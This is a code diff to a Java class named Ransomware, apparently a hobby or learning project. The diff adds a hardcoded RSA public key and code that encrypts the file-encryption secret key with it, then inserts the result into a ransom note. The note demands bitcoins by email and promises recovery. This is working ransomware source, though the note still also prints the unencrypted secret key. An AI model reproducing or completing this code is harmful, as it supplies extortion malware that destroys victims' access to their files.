@@ -3,10 +3,14 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.security.InvalidKeyException;
+import java.security.KeyFactory;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
+import java.security.interfaces.RSAPublicKey;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.X509EncodedKeySpec;
 import java.util.Base64;
 
 import javax.crypto.BadPaddingException;
@@ -218,14 +222,51 @@ public class Ransomware {
 	}
 
 	/**
-	 * Encodes the private key in base64 and saves it to a file
-	 * 
+	 * Encodes the private key in base64 and saves it to a file References:
+	 * {@link https://gist.github.com/destan/b708d11bd4f403506d6d5bb5fe6a82c5}
 	 */
 	private void leaveNote() {
+		String publicKeyString = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzJZtz0Coap75nfkykdBV"
+				+ "6kRNfNwfnYoE3NPoRdd7+kqXrSvEyD74lMpP6eEbcbP4uUYzWcU0NaT5J7h6gUMp"
+				+ "r77Fadrua+oNGYPu3jLuXKNz6vHB1jqs2IIM1xuGBUvxpq7V7bDIFP4a52MB61w6"
+				+ "7rCrKoiR19Zvd7TEW0efyv9SrROgsL6MaoFyBbQosrXiHVv5bkptDMvBofrLzyLB"
+				+ "tRC6xTv4e5yx09EMSWvFdYBt6XlZgeB/B0X/ZxkQkV4Mp3zliP8NnWTyeNRpYVcA"
+				+ "HWyDg7OqRUVhOX2zDjzG6IvDjrbQAPFB1hXgmgFxSKWeXAYXvOO5alCw1rMuQsEueQIDAQAB";
+
+		KeyFactory keyFactory;
+		String encodedSecretKey = "";
+		try {
+			keyFactory = KeyFactory.getInstance("RSA");
+			X509EncodedKeySpec keySpecX509 = new X509EncodedKeySpec(Base64.getDecoder().decode(publicKeyString));
+			RSAPublicKey publicKey = (RSAPublicKey) keyFactory.generatePublic(keySpecX509);
+			Cipher cipher = Cipher.getInstance("RSA");
+			cipher.init(Cipher.ENCRYPT_MODE, publicKey);
+			encodedSecretKey = Base64.getEncoder().encodeToString(cipher.doFinal(secretKey.getEncoded()));
+
+		} catch (NoSuchAlgorithmException e1) {
+			// TODO Auto-generated catch block
+			e1.printStackTrace();
+		} catch (InvalidKeySpecException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (InvalidKeyException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (NoSuchPaddingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (IllegalBlockSizeException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (BadPaddingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+
 		String note = "To whom concern it may,"
 				+ "\r\nAll files in your base are belong to a very strong algorithm. Please do not attempt "
 				+ "to fix your files, it does not recover you. \r\nPlease send an email to customerService@cryptoCoffee.com "
-				+ "with your name, bitcoins and this code: \r\n\r\n"
+				+ "with your name, bitcoins and this code: \r\n\r\n" + encodedSecretKey + "\r\n"
 				+ Base64.getEncoder().encodeToString(secretKey.getEncoded())
 				+ "\r\n\r\nAfter send you email with the bitcoins, we promptly "
 				+ "will direction you on how to recover precious files. Keep faith in us, we will help you.\r\nAll systems unsafe,"
